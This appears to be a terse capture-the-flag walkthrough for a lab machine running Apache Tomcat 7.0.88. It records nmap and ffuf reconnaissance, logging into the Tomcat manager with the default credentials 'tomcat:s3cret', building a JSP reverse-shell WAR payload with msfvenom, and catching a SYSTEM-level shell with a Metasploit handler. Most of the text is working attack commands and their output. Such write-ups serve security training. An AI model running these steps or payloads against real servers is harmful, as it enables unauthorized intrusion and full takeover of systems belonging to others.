nmap
```
$ sudo nmap -sC -sV 10.10.10.95

Nmap scan report for 10.10.10.95
Host is up (0.033s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

ffuf
```
$ ffuf -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.95:8080/FUZZ

aux                     [Status: 200, Size: 0, Words: 1, Lines: 1]
com3                    [Status: 200, Size: 0, Words: 1, Lines: 1]
com2                    [Status: 200, Size: 0, Words: 1, Lines: 1]
com1                    [Status: 200, Size: 0, Words: 1, Lines: 1]
com4                    [Status: 200, Size: 0, Words: 1, Lines: 1]
con                     [Status: 200, Size: 0, Words: 1, Lines: 1]
docs                    [Status: 302, Size: 0, Words: 1, Lines: 1]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1]
favicon.ico             [Status: 200, Size: 21630, Words: 19, Lines: 22]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1]
```

tomcat default creds:

`tomcat:s3cret`

go to http://10.10.10.95:8080/manager

exploit: manual
```
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4545 -f war > shell.war

$ msfconsole

use multi/handler
set payload java/jsp_shell_reverse_tcp
set LHOST tun0
set LPORT 4545
run

[*] Started reverse TCP handler on 10.10.14.2:4545 

$ curl http://10.10.10.95:8080/shell.war

[*] Started reverse TCP handler on 10.10.14.2:4545 
[*] Command shell session 1 opened (10.10.14.2:4545 -> 10.10.10.95:49192) at 2021-07-09 01:42:39 -0400

C:\apache-tomcat-7.0.88>whoami
nt authority\system
```